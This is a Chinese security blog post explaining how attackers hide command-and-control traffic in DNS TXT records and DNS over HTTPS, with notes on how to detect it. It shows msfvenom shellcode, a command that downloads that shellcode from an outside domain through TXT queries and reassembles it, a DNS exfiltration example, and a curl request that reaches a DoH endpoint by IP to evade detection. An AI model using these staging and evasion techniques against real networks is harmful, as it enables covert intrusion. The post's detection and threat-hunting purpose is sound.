<!DOCTYPE html>





<html class="theme-next gemini use-motion" lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="generator" content="Hexo 3.9.0">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/128x128.ico?v=7.3.0">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/128x128.ico?v=7.3.0">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/128x128.ico?v=7.3.0">
  <meta name="google-site-verification" content="GGFme5OaJm26Z2TDjB--Ol2pfQANqnR69mkuVsw70rU">

<link rel="stylesheet" href="/css/main.css?v=7.3.0">


<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
  <link rel="stylesheet" href="/lib/fancybox/source/jquery.fancybox.css">
  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2">


<script id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Gemini',
    version: '7.3.0',
    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
    back2top: {"enable":true,"sidebar":true,"scrollpercent":true},
    copycode: {"enable":true,"show_result":true,"style":null},
    fancybox: true,
    mediumzoom: false,
    lazyload: false,
    pangu: false,
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    },
    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
    search: {
      root: '/',
      path: 'search.xml'
    },
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    translation: {
      copy_button: 'copy',
      copy_success: 'succeed',
      copy_failure: 'failed'
    }
  };
</script>

  <meta name="description" content="通过加密的HTTPS通道进行恶意通信并不是什么新鲜事，但是DoH（通过HTTPS进行DNS查询）可以在很大程度上隐藏与C＆C（又名C2）的通信。 关于当前常用检测方法威胁搜寻中使用的常规方法之一是基于DNS流量检测恶意通信。当攻击者使用旧式方法（例如HTTP（S））与C＆C通信时，如果组织具有能够检测到此类攻击的任何内容（例如DNS防火墙）（例如，OpenDNS Family Shield）和/或">
<meta name="keywords" content="Web安全，移动安全，windows安全，漏洞挖掘，代码审计，智能合约">
<meta property="og:type" content="article">
<meta property="og:title" content="DNS over HTTPS">
<meta property="og:url" content="https://wh0ale.github.io/2020/01/17/DNS-over-HTTPS/index.html">
<meta property="og:site_name" content="Wh0ale&#39;s Blog">
<meta property="og:description" content="通过加密的HTTPS通道进行恶意通信并不是什么新鲜事，但是DoH（通过HTTPS进行DNS查询）可以在很大程度上隐藏与C＆C（又名C2）的通信。 关于当前常用检测方法威胁搜寻中使用的常规方法之一是基于DNS流量检测恶意通信。当攻击者使用旧式方法（例如HTTP（S））与C＆C通信时，如果组织具有能够检测到此类攻击的任何内容（例如DNS防火墙）（例如，OpenDNS Family Shield）和/或">
<meta property="og:locale" content="zh-CN">
<meta property="og:image" content="https://1.bp.blogspot.com/-H-TbrewsCY4/XL86FAQ-ZEI/AAAAAAABqWU/iSQWTt2N93QuFbnQkpMTsV_Nvw46ANjnwCLcBGAs/s1600/doh-wireshark.png">
<meta property="og:image" content="https://1.bp.blogspot.com/-i12t5R7tCUM/XL86O3YoeNI/AAAAAAABqWY/u3rcWeFMYWMyWxSBqBLTjxqmsGAhMXvNwCEwYBhgL/s1600/doh-domainfront-wireshark.png">
<meta property="og:image" content="https://4.bp.blogspot.com/-iCRrXACsINY/XL-DNGbZ5JI/AAAAAAABqY0/9eMUMa4p9rQ-74u9KXOgMBAJVH4KqFKAwCLcBGAs/s1600/doh-blogger_com-domain_fronting-wireshark.png">
<meta property="og:updated_time" content="2020-01-21T05:42:13.304Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="DNS over HTTPS">
<meta name="twitter:description" content="通过加密的HTTPS通道进行恶意通信并不是什么新鲜事，但是DoH（通过HTTPS进行DNS查询）可以在很大程度上隐藏与C＆C（又名C2）的通信。 关于当前常用检测方法威胁搜寻中使用的常规方法之一是基于DNS流量检测恶意通信。当攻击者使用旧式方法（例如HTTP（S））与C＆C通信时，如果组织具有能够检测到此类攻击的任何内容（例如DNS防火墙）（例如，OpenDNS Family Shield）和/或">
<meta name="twitter:image" content="https://1.bp.blogspot.com/-H-TbrewsCY4/XL86FAQ-ZEI/AAAAAAABqWU/iSQWTt2N93QuFbnQkpMTsV_Nvw46ANjnwCLcBGAs/s1600/doh-wireshark.png">
  <link rel="alternate" href="/atom.xml" title="Wh0ale's Blog" type="application/atom+xml">
  <link rel="canonical" href="https://wh0ale.github.io/2020/01/17/DNS-over-HTTPS/">


<script id="page.configurations">
  CONFIG.page = {
    sidebar: "",
  };
</script>

  <title>DNS over HTTPS | Wh0ale's Blog</title>
  








  <noscript>
  <style>
  .use-motion .motion-element,
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-title { opacity: initial; }

  .use-motion .logo,
  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta">

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Wh0ale's Blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
  </div>

  <div class="site-nav-toggle">
    <button aria-label="切换导航栏">
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>



<nav class="site-nav">
    <ul id="menu" class="menu">
        
        
        
          
          <li class="menu-item menu-item-home">
      
    

    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>

  </li>
        
        
        
          
          <li class="menu-item menu-item-about">
      
    

    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>关于</a>

  </li>
        
        
        
          
          <li class="menu-item menu-item-tags">
      
    

    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>

  </li>
        
        
        
          
          <li class="menu-item menu-item-categories">
      
    

    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>

  </li>
        
        
        
          
          <li class="menu-item menu-item-archives">
      
    

    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>

  </li>
        <li class="menu-item menu-item-search">
          <a href="javascript:;" class="popup-trigger">
          
            <i class="menu-item-icon fa fa-search fa-fw"></i> <br>搜索</a>
        </li>
      
    </ul>
    <div class="site-search">
      
  <div class="popup search-popup local-search-popup">
  <div class="local-search-header clearfix">
    <span class="search-icon">
      <i class="fa fa-search"></i>
    </span>
    <span class="popup-btn-close">
      <i class="fa fa-times-circle"></i>
    </span>
    <div class="local-search-input-wrapper">
      <input autocomplete="off"
             placeholder="搜索..." spellcheck="false"
             type="text" id="local-search-input">
    </div>
  </div>
  <div id="local-search-result"></div>
</div>


    </div>
</nav>

</div>
    </header>

    


    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
            

          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    
    <div class="reading-progress-bar"></div>

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://wh0ale.github.io/2020/01/17/DNS-over-HTTPS/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Wh0ale">
      <meta itemprop="description" content="No master and rookie，only hardworking and lazy.">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Wh0ale's Blog">
    </span>
      <header class="post-header">

        
          <h1 class="post-title" itemprop="name headline">DNS over HTTPS

              
            
          </h1>
        

        <div class="post-meta">
        
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              

              
                
              

              <time title="创建时间：2020-01-17 16:19:42" itemprop="dateCreated datePublished" datetime="2020-01-17T16:19:42+08:00">2020-01-17</time>
            </span>
          
            

            
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                
                  <span class="post-meta-item-text">更新于</span>
                
                <time title="修改时间：2020-01-21 13:42:13" itemprop="dateModified" datetime="2020-01-21T13:42:13+08:00">2020-01-21</time>
              </span>
            
          
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/红队/" itemprop="url" rel="index"><span itemprop="name">红队</span></a></span>

                
                
              
            </span>
          

          
            <span class="post-meta-item">
              <span class="post-meta-item-icon"
              >
                <i class="fa fa-eye"></i>
                 阅读次数： 
                <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
              </span>
            </span>
          <br>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-file-word-o"></i>
              </span>
              
                <span class="post-meta-item-text">本文字数：</span>
              
              <span title="本文字数">16k</span>
            </span>
          
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-clock-o"></i>
              </span>
              
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              
              <span title="阅读时长">15 分钟</span>
            </span>
          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">



      
        <p>通过加密的HTTPS通道进行恶意通信并不是什么新鲜事，但是DoH（通过HTTPS进行<a href="https://tools.ietf.org/html/rfc8484" target="_blank" rel="noopener">DNS查询</a>）可以在很大程度上隐藏与C＆C（又名C2）的通信。</p>
<h1 id="关于当前常用检测方法"><a href="#关于当前常用检测方法" class="headerlink" title="关于当前常用检测方法"></a>关于当前常用检测方法</h1><p>威胁搜寻中使用的常规方法之一是基于DNS流量检测恶意通信。当攻击者使用旧式方法（例如HTTP（S））与C＆C通信时，如果组织具有能够检测到此类攻击的任何内容（例如DNS防火墙）（例如，<a href="https://signup.opendns.com/familyshield/" target="_blank" rel="noopener">OpenDNS Family Shield</a>）和/或使用SIEM等进行流量检查，因为常见的检测工具正在使用恶意域的黑名单。当安全研究人员使用蜜罐，执行恶意软件分析等，或者目标公司报告了恶意域时，其他组织可以收集这些工件（例如域）并将其用于检测和/或阻止（例如DNS黑洞）。如“<a href="http://detect-respond.blogspot.com/2013/03/the-pyramid-of-pain.html" target="_blank" rel="noopener">痛苦金字塔</a>” 中所述，这是威胁搜寻的最简单机制之一。</p>
<p>恶意通信的另一种常见方式是仅通过DNS查询与C＆C进行通信，并且恶意软件可以使用例如TXT ，AXFR 或ANY DNS记录与C＆C进行通信，但不仅如此，因为它们全部取决于创造力。</p>
<p>引用<a href="https://blog.talosintelligence.com/2017/03/dnsmessenger.html" target="_blank" rel="noopener">思科Talos情报组</a>：“ 通常，这种DNS使用与信息泄露有关。Talos最近分析了一个有趣的恶意软件样本，该样本利用DNS TXT记录查询和响应来创建双向命令和控制（C2）通道。这使攻击者可以使用DNS通信来提交要在受感染机器上运行的新命令，并将命令执行的结果返回给攻击者。这是管理RAT的一种非常不常见且回避的方式。”，但实际上，这种情况并不少见[<a href="https://attack.mitre.org/techniques/T1071/" target="_blank" rel="noopener">T1071</a>]。使用DNS进行恶意流量的每个想法都有点不同，但是从总体上看，这种检测是相同的。如果办公室中的某些台式计算机正在执行TXT DNS查询，这是否可疑？在哪种实际情况下，台式机而不是服务器在执行TXT 查询？服务器服务通常使用此类查询，例如检查<a href="https://support.google.com/a/answer/33786?hl=en" target="_blank" rel="noopener">SPF</a>，<a href="https://support.google.com/a/answer/174124?hl=en" target="_blank" rel="noopener">DKIM</a>以及<a href="https://support.google.com/a/answer/183895?hl=en" target="_blank" rel="noopener">Google</a>等使用的任何其他域验证。</p>
<p>命令或任何恶意行为者想要从C＆C进行传输的示例传输可能类似于：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"># msfvenom -p windows/exec CMD=calc.exe -b &quot;\x00\x0a\x0d&quot; -f python</span><br><span class="line"># size 220</span><br><span class="line"># &quot;\xd9\xf7\xd9\x74\x24\xf4\x5a\xbf\x3e\x85\xd7\x8e\x2b&quot;</span><br><span class="line"># &quot;\xc9\xb1\x31\x31\x7a\x18\x03\x7a\x18\x83\xc2\x3a\x67&quot;</span><br><span class="line"># &quot;\x22\x72\xaa\xe5\xcd\x8b\x2a\x8a\x44\x6e\x1b\x8a\x33&quot;</span><br><span class="line"># &quot;\xfa\x0b\x3a\x37\xae\xa7\xb1\x15\x5b\x3c\xb7\xb1\x6c&quot;</span><br><span class="line"># &quot;\xf5\x72\xe4\x43\x06\x2e\xd4\xc2\x84\x2d\x09\x25\xb5&quot;</span><br><span class="line"># &quot;\xfd\x5c\x24\xf2\xe0\xad\x74\xab\x6f\x03\x69\xd8\x3a&quot;</span><br><span class="line"># &quot;\x98\x02\x92\xab\x98\xf7\x62\xcd\x89\xa9\xf9\x94\x09&quot;</span><br><span class="line"># &quot;\x4b\x2e\xad\x03\x53\x33\x88\xda\xe8\x87\x66\xdd\x38&quot;</span><br><span class="line"># &quot;\xd6\x87\x72\x05\xd7\x75\x8a\x41\xdf\x65\xf9\xbb\x1c&quot;</span><br><span class="line"># &quot;\x1b\xfa\x7f\x5f\xc7\x8f\x9b\xc7\x8c\x28\x40\xf6\x41&quot;</span><br><span class="line"># &quot;\xae\x03\xf4\x2e\xa4\x4c\x18\xb0\x69\xe7\x24\x39\x8c&quot;</span><br><span class="line"># &quot;\x28\xad\x79\xab\xec\xf6\xda\xd2\xb5\x52\x8c\xeb\xa6&quot;</span><br><span class="line"># &quot;\x3d\x71\x4e\xac\xd3\x66\xe3\xef\xb9\x79\x71\x8a\x8f&quot;</span><br><span class="line"># &quot;\x7a\x89\x95\xbf\x12\xb8\x1e\x50\x64\x45\xf5\x15\x9a&quot;</span><br><span class="line"># &quot;\x0f\x54\x3f\x33\xd6\x0c\x02\x5e\xe9\xfa\x40\x67\x6a&quot;</span><br><span class="line"># &quot;\x0f\x38\x9c\x72\x7a\x3d\xd8\x34\x96\x4f\x71\xd1\x98&quot;</span><br><span class="line"># &quot;\xfc\x72\xf0\xfa\x63\xe1\x98\xd2\x06\x81\x3b\x2b&quot;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$ host -t txt payload.redteam.pl</span><br><span class="line">redteam.pl descriptive text &quot;00 d9f7d97424f45abf3e85d78e2b&quot;</span><br><span class="line">redteam.pl descriptive text &quot;01 c9b131317a18037a1883c23a67&quot;</span><br><span class="line">redteam.pl descriptive text &quot;13 7a8995bf12b81e506445f5159a&quot;</span><br><span class="line">redteam.pl descriptive text &quot;14 0f543f33d60c025ee9fa40676a&quot;</span><br><span class="line">redteam.pl descriptive text &quot;15 0f389c727a3dd834964f71d198&quot;</span><br><span class="line">redteam.pl descriptive text &quot;16 fc72f0fa63e198d206813b2b&quot;</span><br><span class="line">redteam.pl descriptive text &quot;06 980292ab98f762cd89a9f99409&quot;</span><br><span class="line">redteam.pl descriptive text &quot;07 4b2ead03533388dae88766dd38&quot;</span><br><span class="line">redteam.pl descriptive text &quot;08 d6877205d7758a41df65f9bb1c&quot;</span><br><span class="line">redteam.pl descriptive text &quot;09 1bfa7f5fc78f9bc78c2840f641&quot;</span><br><span class="line">redteam.pl descriptive text &quot;10 ae03f42ea44c18b069e724398c&quot;</span><br><span class="line">redteam.pl descriptive text &quot;11 28ad79abecf6dad2b5528ceba6&quot;</span><br><span class="line">redteam.pl descriptive text &quot;12 3d714eacd366e3efb979718a8f&quot;</span><br><span class="line">redteam.pl descriptive text &quot;02 2272aae5cd8b2a8a446e1b8a33&quot;</span><br><span class="line">redteam.pl descriptive text &quot;03 fa0b3a37aea7b1155b3cb7b16c&quot;</span><br><span class="line">redteam.pl descriptive text &quot;04 f572e443062ed4c2842d0925b5&quot;</span><br><span class="line">redteam.pl descriptive text &quot;05 fd5c24f2e0ad74ab6f0369d83a&quot;</span><br></pre></td></tr></table></figure>

<p>每行开头的数字用于保持正确的顺序，因为这是<a href="https://en.wikipedia.org/wiki/Round-robin_DNS" target="_blank" rel="noopener">轮询DNS</a>之类的方法，并且每个答案的顺序都是随机的。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$ host -t txt payload.redteam.pl | awk &apos;&#123;print $4,$5&#125;&apos; | sort | awk &apos;&#123;print $2&#125;&apos; | sed -s &apos;s/&quot;//&apos; | sed &apos;s/../\\x\0/g&apos;</span><br><span class="line">\xd9\xf7\xd9\x74\x24\xf4\x5a\xbf\x3e\x85\xd7\x8e\x2b</span><br><span class="line">\xc9\xb1\x31\x31\x7a\x18\x03\x7a\x18\x83\xc2\x3a\x67</span><br><span class="line">\x22\x72\xaa\xe5\xcd\x8b\x2a\x8a\x44\x6e\x1b\x8a\x33</span><br><span class="line">\xfa\x0b\x3a\x37\xae\xa7\xb1\x15\x5b\x3c\xb7\xb1\x6c</span><br><span class="line">\xf5\x72\xe4\x43\x06\x2e\xd4\xc2\x84\x2d\x09\x25\xb5</span><br><span class="line">\xfd\x5c\x24\xf2\xe0\xad\x74\xab\x6f\x03\x69\xd8\x3a</span><br><span class="line">\x98\x02\x92\xab\x98\xf7\x62\xcd\x89\xa9\xf9\x94\x09</span><br><span class="line">\x4b\x2e\xad\x03\x53\x33\x88\xda\xe8\x87\x66\xdd\x38</span><br><span class="line">\xd6\x87\x72\x05\xd7\x75\x8a\x41\xdf\x65\xf9\xbb\x1c</span><br><span class="line">\x1b\xfa\x7f\x5f\xc7\x8f\x9b\xc7\x8c\x28\x40\xf6\x41</span><br><span class="line">\xae\x03\xf4\x2e\xa4\x4c\x18\xb0\x69\xe7\x24\x39\x8c</span><br><span class="line">\x28\xad\x79\xab\xec\xf6\xda\xd2\xb5\x52\x8c\xeb\xa6</span><br><span class="line">\x3d\x71\x4e\xac\xd3\x66\xe3\xef\xb9\x79\x71\x8a\x8f</span><br><span class="line">\x7a\x89\x95\xbf\x12\xb8\x1e\x50\x64\x45\xf5\x15\x9a</span><br><span class="line">\x0f\x54\x3f\x33\xd6\x0c\x02\x5e\xe9\xfa\x40\x67\x6a</span><br><span class="line">\x0f\x38\x9c\x72\x7a\x3d\xd8\x34\x96\x4f\x71\xd1\x98</span><br><span class="line">\xfc\x72\xf0\xfa\x63\xe1\x98\xd2\x06\x81\x3b\x2b</span><br></pre></td></tr></table></figure>

<p>仅使用DNS查询，我们就可以传输Shellcode。以同样的方式，威胁参与者不仅可以下载信息，而且还可以发送（泄漏）数据，因为每个DNS查询中都有足够的空间来执行此操作</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.</span><br><span class="line">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.</span><br><span class="line">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.</span><br><span class="line">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.example.com</span><br></pre></td></tr></table></figure>

<p>为了检测到这一点，我们可以测量请求的熵，它的长度，频率，响应及其TTL等，但这不是本文的主题，因此我们将跳过它。</p>
<p>整个方法实际上与恶意行为者的创造力有关，但总而言之，通常可以通过对DNS流量的简单检查来基于威胁搜寻来检测攻击者-监视内部DNS日志，以及在可能的情况下不应该与外部DNS服务进行通信通用的组织环境，因为所有计算机通常都使用内部DNS服务器。如果<strong>某些计算机正在从外部DNS服务解析域</strong>，则这肯定会触发警报，并应检查其发生原因。使用这些技术，我们能够检测到与HTTPS C＆C服务器的初始通信，仅通过DNS请求完全完成的C＆C通信，使用DGA（域生成算法）的恶意软件等。</p>
<p>还请记住，攻击者仅使用IP地址即可与HTTP服务器通信，因此无需域和DNS查询，但通常他们不这样做，因为与直接引用硬编码IP的服务相比，删除服务要容易得多删除用于恶意行为的域。如前所述，通常将域硬编码在恶意软件中或使用DGA。对于直接IP通信，我们可以基于<strong>GeoIP</strong>（基于国家/地区），<strong>IP信誉</strong>，<strong>恶意IP列表</strong>（与域相同），<strong>端口和协议检查</strong>等进行检测。通常，这也用作威胁搜寻技术的另一层其中<strong>基于DNS的检测</strong>就是其中之一。这些是威胁狩猎的基础，上面已<em>在“痛苦金字塔”中</em>进行了介绍。</p>
<h1 id="DNS-over-HTTPS（DoH）作为C2通信的通道"><a href="#DNS-over-HTTPS（DoH）作为C2通信的通道" class="headerlink" title="DNS over HTTPS（DoH）作为C2通信的通道"></a>DNS over HTTPS（DoH）作为C2通信的通道</h1><p>某些DoH服务（例如Google或CloudFlare提供的服务）已被归类为可信主机，并且不会在检测系统中触发警报。流向此类供应商的流量在几乎每个组织中都很普遍，这使检测变得更加困难。</p>
<p>DoH正在使用一种为用户隐私而设计的方法，因为您本地网络，ISP等中的每个人都可以看到DNS流量。对于Tor用户等来说，这也是一个问题。总之，没人知道您在youtube.com上观看了什么，但是每个人都知道您访问了youtube.com，因为DNS查询未像HTTPS流量那样被加密。</p>
<p>值得一提的是，还存在DoT（基于TLS的DNS）服务，但由于本文的主要目标是威胁搜寻和红队合作，因此我们将不重点关注。只需监视到853/tcp端口的流量，即可轻松检测到DoT 。如果您的组织中没有人正在使用DoT，则它是一个相当新的且不常见的标准，并且只有一些主机开始使用它进行通信，这就是易于检测到它的原因。我们不是在谈论在隐私方面DoT与DoH有什么更好的关系，所以这就是为什么我们不关注DoT。更不用说这些端口通常会在组织防火墙上被阻止，关于443/tcp（HTTPS）我们不能说。</p>
<p>由于整个通信都是通过HTTPS进行的，因此DoH很难检测到，HTTPS是经过加密的，被认为是普通的网络流量，没有什么特别的可以轻易触发有关恶意通信的警报的：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ curl &apos;https://dns.google.com/resolve?name=example.com&amp;type=TXT&apos;</span><br><span class="line">&#123;&quot;Status&quot;: 0,&quot;TC&quot;: false,&quot;RD&quot;: true,&quot;RA&quot;: true,&quot;AD&quot;: false,&quot;CD&quot;: false,&quot;Question&quot;:[ &#123;&quot;name&quot;: &quot;example.com.&quot;,&quot;type&quot;: 16&#125;],&quot;Answer&quot;:[ &#123;&quot;name&quot;: &quot;example.com.&quot;,&quot;type&quot;: 16,&quot;TTL&quot;: 18585,&quot;data&quot;: &quot;\&quot;v=spf1 -all\&quot;&quot;&#125;]&#125;</span><br></pre></td></tr></table></figure>

<p>该请求的流量如下所示：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">192.168.0.109 192.168.0.1 DNS 74 Standard query 0xfa6c A dns.google.com  </span><br><span class="line">192.168.0.109 192.168.0.1 DNS 74 Standard query 0xb49b AAAA dns.google.com  </span><br><span class="line">192.168.0.1 192.168.0.109 DNS 338 Standard query response 0xfa6c A dns.google.com A 216.58.215.110 NS ns2.google.com NS ns4.google.com NS ns3.google.com NS ns1.google.com A 216.239.32.10 AAAA 2001:4860:4802:32::a A 216.239.34.10 AAAA 2001:4860:4802:34::a A 216.239.36.10 AAAA 2001:4860:4802:36::a A 216.239.38.10 AAAA 2001:4860:4802:38::a  </span><br><span class="line">192.168.0.1 192.168.0.109 DNS 350 Standard query response 0xb49b AAAA dns.google.com AAAA 2a00:1450:401b:803::200e NS ns3.google.com NS ns4.google.com NS ns1.google.com NS ns2.google.com A 216.239.32.10 AAAA 2001:4860:4802:32::a A 216.239.34.10 AAAA 2001:4860:4802:34::a A 216.239.36.10 AAAA 2001:4860:4802:36::a A 216.239.38.10 AAAA 2001:4860:4802:38::a</span><br></pre></td></tr></table></figure>

<p>好的，已经与Google ASN进行了通信，但是我们可以检测到对DNS的dns.google.com 记录查询。这是监视<strong>DoH</strong>端点的一种好方法，但是问题是攻击者可以在没有此DNS查询的情况下建立通信：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ curl -k -H &apos;Host: dns.google.com&apos; &apos;https://216.58.215.78/resolve?name=example.com&amp;type=TXT&apos;</span><br><span class="line">&#123;&quot;Status&quot;: 0,&quot;TC&quot;: false,&quot;RD&quot;: true,&quot;RA&quot;: true,&quot;AD&quot;: true,&quot;CD&quot;: false,&quot;Question&quot;:[ &#123;&quot;name&quot;: &quot;example.com.&quot;,&quot;type&quot;: 16&#125;],&quot;Answer&quot;:[ &#123;&quot;name&quot;: &quot;example.com.&quot;,&quot;type&quot;: 16,&quot;TTL&quot;: 5477,&quot;data&quot;: &quot;\&quot;v=spf1 -all\&quot;&quot;&#125;]&#125;</span><br></pre></td></tr></table></figure>

<p>好的，更好，但仍然可以通过使用Wireshark显示过滤器检测到，例如：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tls.handshake.type == 1 &amp;&amp; !tls.handshake.extension.type == 0</span><br></pre></td></tr></table></figure>

<p><img src="https://1.bp.blogspot.com/-H-TbrewsCY4/XL86FAQ-ZEI/AAAAAAABqWU/iSQWTt2N93QuFbnQkpMTsV_Nvw46ANjnwCLcBGAs/s1600/doh-wireshark.png" alt="img"></p>
<p>如果仅使用HTTP标头“ Host ”选择VirtualHost / Server 与IP直接通信，“ Server Name ”列将不包含任何内容，并且可以警告威胁猎人，因为这种通信并不常见。</p>
<p>前一段时间，德勤希腊道德黑客团队提出了一种技术，他们简称为 <a href="https://dotelite.gr/the-lame-technique/" target="_blank" rel="noopener">LAME技术</a> ，引用了作者的话：“ 有可能获得信任的解析为内部IP地址并将其用于在内部网络内与[C＆C] 建立加密的通信通道的公共DNS名称的SSL证书” 。这是一个很好的例子，说明如何简单地基于DNS的威胁搜寻是有效的。当域解析为LAN或不可路由的IP地址时，如果您的某些组织计算机正在向DNS服务器查询该域，则肯定会触发警报。</p>
<p>从历史上看，这是僵尸网络管理员使用的一种技术，用于临时停用僵尸网络，例如，该僵尸网络基于<strong>IRC</strong>，并且恶意软件二进制文件具有<strong>硬编码域</strong>。每个漫游器都试图在一段时间内重新连接到IRC服务器，但是当域开始指向本地主机时（IN A 127.0.0.1），然后每个漫游器都切换到待机状态–由于没有本地IRC服务而无法连接，因此它在TTL时间过去后一直<strong>尝试连接并查询C＆C域的DNS</strong>。这样，只能通过控制域来关闭一个僵尸网络，因为不控制域，就无法看到僵尸网络的大小，因为僵尸（bot）没有连接到C＆C，而是尝试连接到本地主机。只要域指向那里，也使用了短TTL（在DNS中是秒）。如果僵尸管理员需要访问僵尸网络，那么所有的工作就是启动C＆C，然后更改DNS记录，<strong>只要所请求的域再次指向C＆C IP地址，每个僵尸都会重新连接</strong>。</p>
